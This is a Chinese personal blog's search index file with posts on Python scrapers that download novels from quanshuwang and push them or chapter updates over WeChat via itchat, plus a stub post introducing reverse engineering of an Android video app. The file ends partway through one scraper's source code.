<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>对某视频解析软件的逆向分析</title>
      <link href="/2020/03/07/%E5%AF%B9%E6%9F%90%E8%A7%86%E9%A2%91%E8%A7%A3%E6%9E%90%E8%BD%AF%E4%BB%B6%E7%9A%84%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
      <url>/2020/03/07/%E5%AF%B9%E6%9F%90%E8%A7%86%E9%A2%91%E8%A7%A3%E6%9E%90%E8%BD%AF%E4%BB%B6%E7%9A%84%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>通过逆向工程分析某安卓App的实现原理，因为App也使用了Lua脚本并进行了加密，也借此机会实践一下Lua脚本解密</p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近偶然发现一款全网视频解析的软件，安装后发现首页有影响使用体验的广告存在（<strong>现在作者已取消广告</strong>），同时其附加功能需要加群获取密码才能使用。借这个机会尝试通过逆向工程分析其逻辑，同时这个App使用了Lua脚本并进行了加密，也借此机会实践一下Lua脚本的解密</p><ul><li><p>下面给出软件的原始版本：</p><ul><li><a href="http://t.cn/A67dqdcS" target="_blank" rel="noopener">原始版本</a></li></ul></li><li><p>软件截图</p></li></ul><table><thead><tr><th style="text-align:center">首页</th><th style="text-align:center">VIP功能</th><th style="text-align:center">VIP功能</th></tr></thead><tbody><tr><td style="text-align:center"><img src="/2020/03/07/对某视频解析软件的逆向分析/main.jpg" alt="首页" style="zoom: 25%;"></td><td style="text-align:center"><img src="/2020/03/07/对某视频解析软件的逆向分析/vip1.jpg" alt="vip功能" style="zoom: 25%;"></td><td style="text-align:center"><img src="/2020/03/07/对某视频解析软件的逆向分析/vip2.jpg" alt="vip功能" style="zoom: 25%;"></td></tr></tbody></table><h1 id="0x01-工具"><a href="#0x01-工具" class="headerlink" title="0x01 工具"></a>0x01 工具</h1><ul><li>Apk反编译三件套<ul><li><a href="https://ibotpeaches.github.io/Apktool/install/" target="_blank" rel="noopener">apktool</a>—可以反编译软件的布局文件、图片等资源，方便大家学习一些很好的布局</li><li><a href="https://github.com/pxb1988/dex2jar" target="_blank" rel="noopener">dex2jar</a>—将apk反编译成java源码（classes.dex转化成jar文件）</li><li><a href="http://java-decompiler.github.io/" target="_blank" rel="noopener">jd-gui</a>—查看APK中classes.dex转化成出的jar文件，即源码文件</li></ul></li></ul><h1 id="0x02-分析过程"><a href="#0x02-分析过程" class="headerlink" title="0x02 分析过程"></a>0x02 分析过程</h1><ul><li>等有时间再写</li></ul>]]></content>
      
      
      <categories>
          
          <category> 逆向分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> 逆向 </tag>
            
            <tag> lua </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>爬取全书网指定书籍-server版</title>
      <link href="/2018/12/15/%E7%88%AC%E5%8F%96%E5%85%A8%E4%B9%A6%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B9%A6%E7%B1%8D-server%E7%89%88/"/>
      <url>/2018/12/15/%E7%88%AC%E5%8F%96%E5%85%A8%E4%B9%A6%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B9%A6%E7%B1%8D-server%E7%89%88/</url>
      
        <content type="html"><![CDATA[<p>虽然不看小说了，但是还是分享出来吧！<br><a id="more"></a></p><h1 id="实现功能"><a href="#实现功能" class="headerlink" title="实现功能"></a>实现功能</h1><p>微信端发送小说名到指定微信号（格式：小说名suqir作者），服务器开始在全书网(<code>http://www.quanshuwang.com</code>)爬取该小说，爬取完成后将询问是否下载，确认后将通过微信以文件的形式发送。</p><h1 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#coding:utf-8</span><br><span class="line">import urllib.request</span><br><span class="line">import requests,re</span><br><span class="line">import itchat</span><br><span class="line">from itchat.content import *</span><br><span class="line"></span><br><span class="line">class BookSpyder(object):</span><br><span class="line">    &quot;&quot;&quot;爬取指定小说-server版&quot;&quot;&quot;</span><br><span class="line">    def __init__(self, book_name,book_author):</span><br><span class="line">        super(BookSpyder, self).__init__()</span><br><span class="line">        self.book_author = book_author</span><br><span class="line">        self.headers = &#123;&apos;User-Agent&apos;: &apos;User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36&apos;&#125;</span><br><span class="line">        self.url = &apos;http://www.quanshuwang.com/modules/article/search.php?searchkey=&apos;+urllib.request.quote(book_name.encode(&apos;gb2312&apos;))+&apos;&amp;searchtype=articlename&amp;searchbuttom.x=88&amp;searchbuttom.y=22&apos;</span><br><span class="line">        search_data = requests.get(self.url,headers=self.headers,allow_redirects=False)</span><br><span class="line">        try:</span><br><span class="line">            # 搜索结果唯一时</span><br><span class="line">            self.location = search_data.headers[&apos;location&apos;].split()</span><br><span class="line">            self.location2res(self.location[0])</span><br><span class="line">        except KeyError:</span><br><span class="line">            self.location = re.findall(r&apos;&lt;li&gt;&lt;a target=&quot;_blank&quot; href=&quot;(.*?)&quot;.*?title=&quot;(.*?)&quot;.*&gt;(.*?)&lt;/a&gt;&lt;em class=.*?&gt;(.*?)&lt;a href=&apos;,search_data.content.decode(&apos;gbk&apos;))</span><br><span class="line">            for http in self.location:</span><br><span class="line">                flag = self.location2res(http[0])</span><br><span class="line">                if flag == 1:</span><br><span class="line">                    break</span><br><span class="line"></span><br><span class="line">        #link</span><br><span class="line">        self.booklink = re.findall(r&apos;class=&quot;leftso png_bg&quot;&gt;&lt;a href=&quot;(.*?)&quot;&apos;,self.res)[0]</span><br><span class="line">        #正则匹配书名</span><br><span class="line">        self.book_name = re.findall(r&apos;&lt;meta property=&quot;og:title&quot; content=&quot;(.*?)&quot;/&gt;&apos;,self.res)[0]</span><br><span class="line">        response = requests.get(self.booklink,headers=self.headers).content.decode(&apos;gbk&apos;)</span><br><span class="line">        #正则匹配所有章节及其链接</span><br><span class="line">        self.contents = re.findall(r&apos;&lt;li&gt;&lt;a href=&quot;(.*?)&quot; title=&quot;(.*?)&quot;&gt;.*?&lt;/a&gt;&lt;/li&gt;&apos;,response)</span><br><span class="line">        #总章数</span><br><span class="line">        self.len = len(self.contents)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def location2res(self,location):</span><br><span class="line">        flag = -1</span><br><span class="line">        self.res = requests.get(location,headers=self.headers).content.decode(&apos;gbk&apos;)</span><br><span class="line">        author = re.findall(r&apos;&lt;meta property=&quot;og:novel:author&quot; content=&quot;(.*?)&quot;&apos;,self.res)[0]</span><br><span class="line">        if self.book_author == author:</span><br><span class="line">            flag = 1</span><br><span class="line">            try:</span><br><span class="line">                self.description = re.findall(r&apos;介绍:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;(.*?)&lt;/div&gt;&apos;,self.res,re.S)[0].replace(&apos;&amp;nbsp;&apos;,&apos;&apos;).replace(&apos;&lt;br /&gt;&apos;,&apos;&apos;)</span><br><span class="line">            except IndexError:</span><br><span class="line">                pass</span><br><span class="line">        return flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def save(self):</span><br><span class="line">        i = 0</span><br><span class="line">        #开始写入文件</span><br><span class="line">        with open(&apos;./book/suqir.txt&apos;,&apos;w&apos;,encoding=&apos;utf-8&apos;,errors=&apos;ignore&apos;) as text_save:</span><br><span class="line">            text_save.write(self.book_name+&apos;\n作者：&apos;+self.book_author)</span><br><span class="line">            if &apos;self.description&apos; in dir():</span><br><span class="line">                text_save.write(&apos;\n简介：&apos;+self.description)</span><br><span class="line">            text_save.write(&apos;\n&apos;)</span><br><span class="line">            for num in self.contents:</span><br><span class="line">                #获取单章文本</span><br><span class="line">                text_r = requests.get(num[0],headers=self.headers)</span><br><span class="line">                text_c = text_r.content</span><br><span class="line">                text = text_c.decode(&apos;gb18030&apos;)</span><br><span class="line">                #获取章节名</span><br><span class="line">                title = num[1].replace(re.findall(r&apos;，共\d*字&apos;,num[1])[0],&apos;&apos;)</span><br><span class="line">                try:</span><br><span class="line">                    #正则匹配内容</span><br><span class="line">                    text = re.findall(r&apos;&lt;/script&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;(.*?)&lt;script type=&quot;text/javascript&quot;&gt;&apos;,text,re.S)[0]</span><br><span class="line">                    #数据清洗</span><br><span class="line">                    text = text.replace(&apos;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&apos;,&apos;&apos;)</span><br><span class="line">                    text = text.replace(&apos;&lt;br /&gt;&apos;,&apos;&apos;)</span><br><span class="line">                    text = text.replace(&apos;\r\n\r\n&apos;,&apos;\r\n&apos;)</span><br><span class="line"></span><br><span class="line">                    text_save.write(&apos;\n&apos;)</span><br><span class="line">                    text_save.write(title)</span><br><span class="line">                    text_save.write(&apos;\n\n&apos;)</span><br><span class="line">                    text_save.write(text)</span><br><span class="line">                    text_save.write(&apos;\n&apos;)</span><br><span class="line">                    print(&apos;[*]%-30s\t完成度%.3f%%&apos;%(title,(i+1) * 100 / self.len))</span><br><span class="line">                    i += 1</span><br><span class="line">                except IndexError as e:</span><br><span class="line">                    print(&apos;【*】%s下载失败&apos;%title)</span><br><span class="line">            text_save.write(&apos;\n===全书完===\n==by苏乞儿==\n&apos;)</span><br><span class="line"></span><br><span class="line">    def get_bookname(self):</span><br><span class="line">        return self.book_name</span><br><span class="line"></span><br><span class="line">    def get_bookauthor(self):</span><br><span class="line">        return self.book_author</span><br><span class="line"></span><br><span class="line">    def get_des(self):</span><br><span class="line">        try:</span><br><span class="line">            return self.description</span><br><span class="line">        except AttributeError:</span><br><span class="line">            return &apos;无简介&apos;</span><br><span class="line"></span><br><span class="line">    def get_centents(self):</span><br><span class="line">        return self.len</span><br><span class="line"></span><br><span class="line">    def get_booklink(self):</span><br><span class="line">        return self.booklink</span><br><span class="line"></span><br><span class="line">def getUserName():</span><br><span class="line">    itchat.auto_login(hotReload=True,enableCmdQR=2)</span><br><span class="line">    onlyUser = itchat.search_friends(name=&apos;杰帅&apos;)</span><br><span class="line">    return onlyUser[0][&apos;UserName&apos;]</span><br><span class="line"></span><br><span class="line">@itchat.msg_register([TEXT],isFriendChat=True)</span><br><span class="line">def text_reply(msg):</span><br><span class="line">    global userName</span><br><span class="line">    if msg[&apos;FromUserName&apos;] == userName:</span><br><span class="line">        try:</span><br><span class="line">            bookName,bookAuthor = msg[&apos;Text&apos;].split(&apos;suqir&apos;)</span><br><span class="line">            book = BookSpyder(bookName,bookAuthor)</span><br><span class="line">            itchat.send(&apos;书名：%s\n作者：%s\n简介：%s&apos; % (bookName,bookAuthor,book.get_des()),toUserName=userName)</span><br><span class="line">            itchat.send(&apos;正在爬取《%s》...&apos; % bookName,toUserName=userName)</span><br><span class="line">            print(&apos;[*]正在爬取《%s》...&apos; % bookName)</span><br><span class="line">            book.save()</span><br><span class="line">            itchat.send(&apos;爬取完毕！是否下载？(是/否)&apos;,toUserName=userName)</span><br><span class="line">        except ValueError:</span><br><span class="line">            if msg[&apos;Text&apos;] == &apos;是&apos;:</span><br><span class="line">                print(&apos;[*]正在发送文件...&apos;)</span><br><span class="line">                itchat.send(&apos;正在上传...&apos;,toUserName=userName)</span><br><span class="line">                itchat.send_file(&apos;./book/suqir.txt&apos;,toUserName=userName)</span><br><span class="line">                print(&apos;[*]已发送文件！\n等待下次请求...&apos;)</span><br><span class="line">                itchat.send(&apos;感谢使用！&apos;,toUserName=userName)</span><br><span class="line">            elif msg[&apos;Text&apos;] == &apos;否&apos;:</span><br><span class="line">                itchat.send(&apos;已取消，感谢使用！&apos;,toUserName=userName)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    print(&apos;[*]Starting...&apos;)</span><br><span class="line">    userName = getUserName()</span><br><span class="line">    itchat.run()</span><br></pre></td></tr></table></figure><h1 id="运行部分截图"><a href="#运行部分截图" class="headerlink" title="运行部分截图"></a>运行部分截图</h1><h2 id="服务器端"><a href="#服务器端" class="headerlink" title="服务器端"></a>服务器端</h2><p><img src="/2018/12/15/爬取全书网指定书籍-server版/server.jpg" alt="服务器"></p><h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><p><img src="/2018/12/15/爬取全书网指定书籍-server版/vx.jpg" alt="微信"></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>利用微信实现小说更新提醒</title>
      <link href="/2018/11/26/%E5%88%A9%E7%94%A8%E5%BE%AE%E4%BF%A1%E5%AE%9E%E7%8E%B0%E5%B0%8F%E8%AF%B4%E6%9B%B4%E6%96%B0%E6%8F%90%E9%86%92/"/>
      <url>/2018/11/26/%E5%88%A9%E7%94%A8%E5%BE%AE%E4%BF%A1%E5%AE%9E%E7%8E%B0%E5%B0%8F%E8%AF%B4%E6%9B%B4%E6%96%B0%E6%8F%90%E9%86%92/</url>
      
        <content type="html"><![CDATA[<p>继上一篇关于爬书的文章后，我堕落的看起了小说。人生最痛苦的事莫过于—小说断更了!<br><a id="more"></a><br>不过世界总是需要懒人的，因为有了懒人创造世界。这话不是我说的，是马爸爸说的：</p><blockquote><p>懒不是傻懒，如果你想少干，就要想出懒的方法。要懒出风格，懒出境界。——马云</p></blockquote><p>为此我专门买了一台服务器（9.9还包邮哦），反正以后还有很多地方用到服务器。</p><p>扯远了。。。利用服务器可以干很多事，比如接下来的利用微信第三方python库实现小说更新时通过微信将更新内容发给指定朋友。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#coding:utf-8</span><br><span class="line">import time,itchat</span><br><span class="line"> # 微信登录</span><br><span class="line">def vxLogin(rename):</span><br><span class="line">    # enableCmdQR：在命令行中显示登录二维码，参数2是Linux系统下的字符宽度</span><br><span class="line">    itchat.auto_login(hotReload=True,enableCmdQR=2)</span><br><span class="line">    friends = itchat.get_friends(update=True)</span><br><span class="line">    for friend in reversed(friends):</span><br><span class="line">        if friend[&apos;RemarkName&apos;] == rename:</span><br><span class="line">            toName = friend[&apos;UserName&apos;]</span><br><span class="line">            return toName</span><br><span class="line"></span><br><span class="line"># 检查更新</span><br><span class="line">def update(url,start,toName):</span><br><span class="line">    import requests,re</span><br><span class="line">    res = requests.get(url).content.decode(&apos;gb18030&apos;)</span><br><span class="line">    lis = re.findall(r&apos;&lt;li&gt;&lt;a href=&quot;(.*?)&quot; title=&quot;(.*?)，.*?&quot;&gt;&apos;,res)</span><br><span class="line">    toName = vxLogin(rename=toName)</span><br><span class="line">    for li in lis[start:]:</span><br><span class="line">        end_str = li[1]</span><br><span class="line">        try:</span><br><span class="line">            end = int(re.findall(r&apos;第[ ]?(.*?)[ ]?章&apos;,end_str)[0])</span><br><span class="line">        except ValueError:</span><br><span class="line">            print(&apos;[*]小说更新了，但是章节序号为中文，我暂时不想处理。。。&apos;) #碰到这种情况再更新，懒</span><br><span class="line">            exit()</span><br><span class="line">        if end &gt;= start+1:</span><br><span class="line">            text = requests.get(li[0]).content.decode(&apos;gbk&apos;)</span><br><span class="line">            re_text = re.findall(r&apos;&lt;/script&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;(.*?)&lt;script&apos;,text,re.S)[0]</span><br><span class="line">            re_text = re_text.replace(&apos;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&apos;,&apos;&apos;)</span><br><span class="line">            re_text = re_text.replace(&apos;&lt;br /&gt;&apos;,&apos;&apos;)</span><br><span class="line">            re_text = re_text.replace(&apos;\r\n\r\n&apos;,&apos;\r\n&apos;)</span><br><span class="line">            re_text = &apos;%s\n%s\n\n&apos; %(li[1],re_text)</span><br><span class="line">            print(&apos;更新：%s&apos; % li[1])</span><br><span class="line">            text = &apos;最近更新了第%s章\n%s&apos; % (end,re_text)</span><br><span class="line">            length = len(text)//3</span><br><span class="line">            # 分3段发送</span><br><span class="line">            itchat.send(msg=text[:length], toUserName=toName)</span><br><span class="line">            itchat.send(msg=text[length:(length*2)], toUserName=toName)</span><br><span class="line">            itchat.send(msg=text[(length*2):], toUserName=toName)</span><br><span class="line">            time.sleep(5)</span><br><span class="line">    print(&apos;[*]更新完成！暂无最新章节&apos;)</span><br><span class="line">    # 声明startNum为全局变量，这样就不会在这个函数内部新建变量</span><br><span class="line">    global startNum</span><br><span class="line">    startNum = end</span><br><span class="line">    time.sleep(3600)# 1小时更新检查一次</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    print(&apos;[*]Starting...&apos;)</span><br><span class="line">    # 当前最新章节</span><br><span class="line">    startNum = 410</span><br><span class="line">    while True:</span><br><span class="line">       update(url=&apos;http://www.quanshuwang.cn/book/137/137120&apos;,start=startNum,toName=&apos;杰帅&apos;)# toName为None时发给自己</span><br><span class="line">    # 持续运行</span><br><span class="line">    itchat.run()</span><br></pre></td></tr></table></figure><p>这里的url<code>http://www.quanshuwang.cn/book/137/137120</code>是我看的<code>《一步偷天》</code>在全书网的网址</p><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><h3 id="服务器端："><a href="#服务器端：" class="headerlink" title="服务器端："></a>服务器端：</h3><p><img src="/2018/11/26/利用微信实现小说更新提醒/server.png" alt="服务器"></p><h3 id="微信端："><a href="#微信端：" class="headerlink" title="微信端："></a>微信端：</h3><p><img src="/2018/11/26/利用微信实现小说更新提醒/weixin.jpg" alt="微信"></p><p>小说也看完了，终于又可以开始写bug了！！</p><hr><p>另外，这个个人博客只作分享交流技术用，大爷们不用<strong>打赏</strong>，真的不用，真的不用，（疯狂暗示中…）</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>爬取全书网指定书籍</title>
      <link href="/2018/11/07/%E7%88%AC%E5%8F%96%E5%85%A8%E4%B9%A6%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B9%A6%E7%B1%8D/"/>
      <url>/2018/11/07/%E7%88%AC%E5%8F%96%E5%85%A8%E4%B9%A6%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B9%A6%E7%B1%8D/</url>
      
        <content type="html"><![CDATA[<h2 id="更新（2018年11月26日）：-后期使用过程发现还有不少bug，不过毕竟算第一篇爬虫，这边就不删除了，留个纪念吧！较完善的服务器版本在这里："><a href="#更新（2018年11月26日）：-后期使用过程发现还有不少bug，不过毕竟算第一篇爬虫，这边就不删除了，留个纪念吧！较完善的服务器版本在这里：" class="headerlink" title="更新（2018年11月26日）： 后期使用过程发现还有不少bug，不过毕竟算第一篇爬虫，这边就不删除了，留个纪念吧！较完善的服务器版本在这里："></a>更新（2018年11月26日）： 后期使用过程发现还有不少bug，不过毕竟算第一篇爬虫，这边就不删除了，留个纪念吧！较完善的服务器版本在这里：</h2><p>最近看了一部基于小说改编的电视剧，闲的无聊就去看了看小说。<a id="more"></a>但是大多数看书网站都有或多或少的广告，强迫症表示很难受，加之近来正在学习Python，便想着利用Python爬取小说的内容，远离广告的‘宠信’。</p><h1 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h1><p>程序实现原理很简单，将用户输入的书名提交到全书网进行搜索，将返回的结果存在list中并展示给用户，对用户选择的书籍进行书籍内容的爬取，并写入文件。</p><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>初次学习写这种爬虫，代码难免冗余难读，但关键部分均写有注释，在此分享出来以作交流。<br>在实际操作过程中也遇到不少问题，比如：如果所查询的书籍在全书网中只有唯一的一本，全书网将直接通过location进行重定向到书籍详情页，与多本书的处理方式不一致，所以为了完美的获取书记简介必须写个if判断；再如：用户提交的书名必须经过gb2312编码并转urlencoding后才能查询到，否则服务器返回错误。。。不过，也可能是我第一次写，有更好的处理方法，希望自己继续努力吧！</p><h1 id="源代码："><a href="#源代码：" class="headerlink" title="源代码："></a>源代码：</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import requests,sys,re</span><br><span class="line">import urllib.request</span><br><span class="line"></span><br><span class="line">class Bookspider(object):</span><br><span class="line">    &quot;&quot;&quot;爬取全书网指定书籍并下载到本地&quot;&quot;&quot;</span><br><span class="line">    def __init__(self):</span><br><span class="line">        super(Bookspider, self).__init__()</span><br><span class="line">        self.request = requests.session()</span><br><span class="line">        self.headers = &#123;</span><br><span class="line">            #随机指定user-agent</span><br><span class="line">            &apos;User-Agent&apos;: &apos;User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36&apos;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">    def book_search(self,name):</span><br><span class="line">        print(&apos;[*]搜索中...&apos;)</span><br><span class="line">        #全书网的搜索url</span><br><span class="line">        #对name进行url编码：urllib.request.quote</span><br><span class="line">        self.url = &apos;http://www.quanshuwang.com/modules/article/search.php?searchkey=&apos;+urllib.request.quote(name.encode(&apos;gb2312&apos;))+&apos;&amp;searchtype=articlename&amp;searchbuttom.x=88&amp;searchbuttom.y=22&apos;</span><br><span class="line">        #禁止重定向：allow_redirects=False</span><br><span class="line">        search_data = self.request.get(self.url,headers=self.headers,allow_redirects=False)</span><br><span class="line">        try:</span><br><span class="line">            #所爬书籍唯一时被重定向到location</span><br><span class="line">            self.location = search_data.headers[&apos;location&apos;]</span><br><span class="line">            #将str的location转换成list，方便计算length</span><br><span class="line">            self.location = self.location.split()</span><br><span class="line">        except KeyError as e:</span><br><span class="line">            response = search_data.content.decode(&apos;gbk&apos;)</span><br><span class="line">            